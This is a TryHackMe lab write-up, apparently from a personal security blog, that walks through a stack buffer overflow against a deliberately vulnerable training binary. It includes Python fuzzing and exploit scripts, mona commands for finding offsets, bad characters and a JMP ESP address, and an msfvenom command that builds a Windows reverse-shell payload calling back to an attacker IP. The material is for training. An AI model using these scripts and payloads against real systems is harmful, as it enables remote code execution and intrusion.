---
layout: single
title: Buffer Overflow Prep (OSCP STYLE)
excerpt: "Even though buffer overflow is no longer included in the OSCP certification, I believe it is still a very interesting technique that everyone should be familiar with. That's why in this write-up, we will explain how to perform one manually."
date: 2023-06-06
classes: wide
header:
  teaser: /assets/images/bof/portada.png
  teaser_home_page: true
categories:
  - TryHackMe
  - infosec
tags:
  - TryHackMe
  - BufferOverFlow
  - CheatSheet
---

## OVERFLOW 1

First we should connect to the machine through xfreerdp tool

```
xfreerdp /u:admin /p:password /cert:ignore /v:IP /workarea
```

On this exercise we'll be handling Immunity Debugger with an oscp binary created by  [@Mojodojo_101](https://twitter.com/Mojodojo_101)

The binary will open in a "paused" state, we should run Debug -> Run and a terminal should open indicating that its running on port 1337

![1]

To probe that we have done all right to get the connection, we should connecto through nc and execute `OVERFLOW1 test` the response should be `OVERFLOW1 COMPLETE` after that we can close the conection

### Mona configuration

Mona is a powerful plugin for Immunity Debugger that makes exploiting buffer overflows much easier

[Mona](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

```
!mona config -set workingfolder c:\mona\oscp\%p
```

It is preinstalled in the window machine, in case that we need to configure it I shared the original repository above

### Fuzzing

We should create a file called fuzzing.py

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.137.202"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

And run it, with thi script we are gonna to be able to know the amount of bytes that make the server crash

![2]

It crash with 2000 bytes

### Crash Replication & Controlling EIP

Create another file on your Kali box called exploit.py with the following contents:

```
import socket

ip = "10.10.137.202"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


Now we should create a patterna of a length 400 bytes longer that the string that crashed the server, in our case 2000 bytes, so the command should be.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```

![3]

Copy the output and place it into the payload variable of the exploit.py script.

![4]

Going back to Immunity Debugger we should re-open the oscp.exe file, click on the red play icon and in our atcker machine run `python3 exploit.py`

![5]

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 2400`

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

![6]

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

![7]

Re-run the oscp.exe file in immunity debuger and launch the exploit.py file with the modified fields

![8]

### Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

```
!mona bytearray -b "\x00"
```

![9]

You can  create a script too that generates a string of bad charts that is identical to the bytearray:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

![10]

Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

![11]

```
ESP: 01AEFA30
```

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![12]

In our case we have the following bad chars

```
\x00\x07\x08\x2e\x2f\xa0\xa1
```

Now we should create a new bytearray excluding the new badchars that we have found, in this "bad chars" string, the characters \x08 \x2f \xa1 can be excluded since bad chars sometims corrupt also the next chart

```
!mona bytearray -b "\x00\x07\x2e\xa0"
```

And this is the new bytearray

![13]

```
"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3"
"\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3"
"\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

```

We should modificate the payload field in our exploit.py with this new array

![14]

Repeat the process and now you should fid the Unmodified Status

![15]

Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

### Finding a Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):  

`!mona jmp -r esp -cpb "\x00"`

![16]

Right Click in one of the adreess and copy to the clipboard

```
625011AF
```

Since windows7 has Little Endian notation, we should write the address in reverse mode

Immunity Debugger DIrection: 625011AF
Converted Direction: ``\xaf\x11\x50\x62

We just need to paste this direction in out exploit.py script

### Creating malicious Payload

We need to create a payload using msfvenom with the following parameters:

-p windows/shell_reverse_tcp: Indicates that we want a Windows reverse shell. LHOST LPORT: Specifies the IP and port it should connect to. 

EXITFUNC=thread: Ensures that all operations are performed in a child process, so when we crash the application, the parent process doesn't terminate (which could potentially cause a BSOD on the system).

-b: Specifies the badchars that should not be used in the payload. 

-f c: Requests the output in C code format.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.59.189 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

![17]

Paste it in the payload field of your script with the following notation

![18]

### Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```


Now we only need to re-run the oscp.exe in the immunity debuger and launch our exploit to received a reverse shell in a nc listener through the port 4444

![19]





[1]:/assets/images/bof/1.png
[2]:/assets/images/bof/2.png
[3]:/assets/images/bof/3.png
[4]:/assets/images/bof/4.png
[5]:/assets/images/bof/5.png
[6]:/assets/images/bof/6.png
[7]:/assets/images/bof/7.png
[8]:/assets/images/bof/8.png
[9]:/assets/images/bof/9.png
[10]:/assets/images/bof/10.png
[11]:/assets/images/bof/11.png
[12]:/assets/images/bof/12.png
[13]:/assets/images/bof/13.png
[14]:/assets/images/bof/14.png
[15]:/assets/images/bof/15.png
[16]:/assets/images/bof/16.png
[16]:/assets/images/bof/16.png
[17]:/assets/images/bof/17.png
[18]:/assets/images/bof/18.png
[19]:/assets/images/bof/19.png
